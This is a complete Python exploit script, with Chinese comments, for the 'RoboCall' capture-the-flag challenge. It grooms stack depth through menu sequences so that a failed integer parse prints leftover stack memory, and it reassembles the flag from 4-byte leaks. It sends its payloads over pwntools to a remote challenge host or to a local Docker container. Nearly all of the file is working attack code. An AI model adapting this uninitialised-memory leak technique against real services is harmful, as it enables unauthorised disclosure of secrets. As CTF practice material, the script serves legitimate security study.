#!/usr/bin/env python3
"""RoboCall 最终利用：栈深控制 + 未初始化槽打印泄漏 flag 碎片
机制：
  place_flag 将 flag 按 CHUNK_DEPTH 表打散为 13 块放在栈残留，原始副本在 rbp_pf-0x2060
  cancel_plan 第二问非数字 → raw_parse_int 失败不写输出槽 → raw_print_int 打印 [rbp-0x204] 栈残留
  通过菜单"环"精确控制 cancel_plan 的栈深，使泄漏槽对准目标块
环增量（实测）：scream=0x120  report=0x400  tech=0x410  billing=0x430
               upgrade=0x440  swo=0x4C0  cp出口=0x880
块 i 对齐条件：Σ环 == CHUNK_DEPTH[i]；buf 原件 off 窗口条件：Σ = 0x1A1C-off (off≡12 mod 16)

用法：
  ./solve.py --remote              # 打远程 sunshinectf.games:26199
  ./solve.py                       # 本地 docker 验证（挂载本脚本所在目录，
                                   #   需 robocall 二进制 + flag.txt 同目录放置）
"""
import os
import re
import struct
import subprocess
import sys
import time

CHUNK_DEPTH = [0x400, 0x480, 0x520, 0x570, 0x5A0, 0x640, 0x690, 0x6C0,
               0x760, 0x7B0, 0x7E0, 0x800, 0x880]
BUF_WINDOW_SUM = 0x1A1C  # buf 副本: Σ = 0x1A1C - off

REP = [b'1', b'2', b'x']                          # 0x400
TECH = [b'1', b'4', b'2', b'a', b'b', b'c']       # 0x410
SCREAM = 0x120
REP_D, TECH_D = 0x400, 0x410

# (块索引, 环序列, screams, buf_off_or_None)
PLANS = [
    (0,  [REP], 0, None),
    (1,  [], 4, None),
    (2,  [REP], 1, None),
    (3,  [REP, TECH], 16, 12),   # buf off=12 特例: Σ=0x1A1C-0xC=0x1A10
    (4,  [], 5, None),
    (5,  [REP], 2, None),
    (7,  [], 6, None),
    (8,  [REP], 3, None),
    (10, [], 7, None),
    (11, [REP, REP], 0, None),
    (12, [REP], 4, None),
]


def selfcheck():
    """启动时校验每个 PLAN 的 Σ 与对齐条件（防方案表手改漂移）"""
    for idx, seqs, screams, buf_off in PLANS:
        total = (REP_D * seqs.count(REP) + TECH_D * seqs.count(TECH)
                 + SCREAM * screams)
        if buf_off is not None:
            expect = BUF_WINDOW_SUM - buf_off
            kind = f"buf off={buf_off}"
        else:
            expect = CHUNK_DEPTH[idx]
            kind = f"块{idx}"
        if total != expect:
            sys.exit(f"自检失败: {kind} Σ={total:#x} != 期望 {expect:#x}")


def build(seqs, screams):
    out = [b'42']
    for s in seqs:
        out += s
    out += [b'3', b'1'] * screams
    out += [b'1', b'6', b'2', b'a', b'b', b'c', b'z', b'z']
    return b'\n'.join(out) + b'\n'


def leak_once(payload, remote_mode, local_dir):
    """单次泄漏尝试，返回 (chunk_bytes | None, stdout_data, stderr)"""
    if remote_mode:
        from pwn import remote, context
        context.log_level = 'error'
        io = remote('sunshinectf.games', 26199, timeout=20)
        io.send(payload)
        data = io.recvall(timeout=30)
        io.close()
        return data, b'', b''
    res = subprocess.run(
        ['docker', 'run', '--rm', '-i', '--platform', 'linux/amd64',
         '-v', f'{local_dir}:/work', '-w', '/work', 'ubuntu:22.04', './robocall'],
        input=payload, capture_output=True, timeout=180)
    return res.stdout, res.stdout, res.stderr


def main():
    remote_mode = '--remote' in sys.argv
    local_dir = os.path.dirname(os.path.abspath(__file__))
    if not remote_mode:
        binp = os.path.join(local_dir, 'robocall')
        if not os.path.exists(binp):
            sys.exit(f'错误: 本地模式需 robocall 与本脚本同目录（缺 {binp}）')
        if not os.access(binp, os.X_OK):
            sys.exit(f'错误: {binp} 无执行权限——先 chmod +x（或复制到工作目录加权限）')
        if not os.path.exists(os.path.join(local_dir, 'flag.txt')):
            sys.exit('错误: 本地模式需 flag.txt 与本脚本同目录（自备测试 flag）')
    selfcheck()
    flag = bytearray(b'?' * 52)
    attempts = 3 if remote_mode else 1   # 远程偶发抖动（随机输出量/网络）重试 3 次; 本地确定性不重试
    for idx, seqs, screams, _buf_off in PLANS:
        payload = build(seqs, screams)
        chunk = None
        last_err = b''
        for attempt in range(attempts):
            data, _out, err = leak_once(payload, remote_mode, local_dir)
            m = re.search(rb'entered "(-?\d+)"', data)
            if m:
                chunk = struct.pack('<i', int(m.group(1)))
                break
            last_err = err
            if attempt < attempts - 1:
                time.sleep(2)
        if chunk is None:
            diag = last_err.decode('latin1', 'ignore')[-120:] if last_err else ''
            print(f'块{idx:2d} [{4*idx}:{4*idx+4}] FAILED({attempts}次尝试)'
                  + (f'（stderr尾: {diag!r}）' if diag else ''))
            continue
        flag[4*idx:4*idx+4] = chunk
        print(f'块{idx:2d} [{4*idx}:{4*idx+4}] = {chunk!r}')
    print()
    print('FLAG:', flag.decode('latin1'))


if __name__ == '__main__':
    main()
